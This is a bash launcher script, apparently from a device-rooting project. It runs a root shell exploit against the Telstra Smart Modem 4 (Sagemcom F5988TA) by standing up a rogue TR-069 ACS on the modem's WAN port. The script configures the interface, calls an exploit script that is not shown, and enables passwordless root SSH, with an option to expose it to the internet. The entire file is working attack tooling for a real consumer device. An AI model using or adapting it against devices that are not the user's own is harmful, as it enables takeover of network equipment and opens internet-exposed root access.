#!/bin/bash
set -e

IFACE="${SM4_IFACE:-en8}"
SERVER_IP="58.162.0.1"
MODEM_IP="58.162.0.2"

echo ""
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║   Telstra Smart Modem 4 — Root Shell Exploit    ║"
echo "  ║   Sagemcom F5988TA (CWE-295)                    ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo ""
echo "  Connect your Mac to the modem's WAN port via USB"
echo "  Ethernet adapter (interface: $IFACE)."
echo ""
echo "  Select mode:"
echo ""
echo "    1) LAN root shell"
echo "       SSH accessible from LAN side only (192.168.0.0/24)"
echo "       Connect via: ssh root@192.168.0.1"
echo ""
echo "    2) WAN root shell"
echo "       SSH accessible from any IP (0.0.0.0/0)"
echo "       Connect via: ssh root@192.168.0.1 (LAN)"
echo "                 or: ssh root@<WAN-IP>    (WAN)"
echo ""
echo "       ⚠  WARNING: WAN mode exposes SSH to the internet."
echo "       ⚠  TR-069 (remote management) remains active and"
echo "       ⚠  your ISP can push config changes or disable SSH."
echo "       ⚠  TR-069 behaviour varies by ISP/firmware — do NOT"
echo "       ⚠  blindly kill it without understanding what it does"
echo "       ⚠  on YOUR device. Disabling it incorrectly can break"
echo "       ⚠  WAN connectivity or brick the modem."
echo ""

read -rp "  Enter choice [1/2]: " choice
case "$choice" in
  1) MODE="lan" ;;
  2) MODE="wan" ;;
  *) echo "  Invalid choice."; exit 1 ;;
esac

if ! command -v node &>/dev/null; then
  echo "  ERROR: Node.js not found. Install Node.js 18+ first."
  exit 1
fi

NODE_VER=$(node -v | sed 's/v//' | cut -d. -f1)
if [ "$NODE_VER" -lt 18 ] 2>/dev/null; then
  echo "  WARNING: Node.js $NODE_VER detected, v18+ recommended."
fi

echo ""
echo "  Setting up $IFACE with $SERVER_IP/24..."

if ! ifconfig "$IFACE" &>/dev/null; then
  echo "  ERROR: Interface $IFACE not found."
  echo "  Plug in your USB Ethernet adapter, then retry."
  echo "  Override with: SM4_IFACE=en9 ./root.sh"
  exit 1
fi

sudo ifconfig "$IFACE" "$SERVER_IP" netmask 255.255.255.0 up

echo "  Starting rogue ACS (mode: $MODE)..."
echo "  Power-cycle the modem now, or wait for its next TR-069 Inform."
echo ""
echo "  When you see 'SshdAllowedIPList SPV Status=0', SSH is enabled."
echo "  Root has no password by default — set one after connecting:"
echo "    ssh root@192.168.0.1"
echo "    passwd"
echo ""
echo "  Press Ctrl+C to stop."
echo ""

sudo node "$(dirname "$0")/exploit/recon.js" "$MODE"
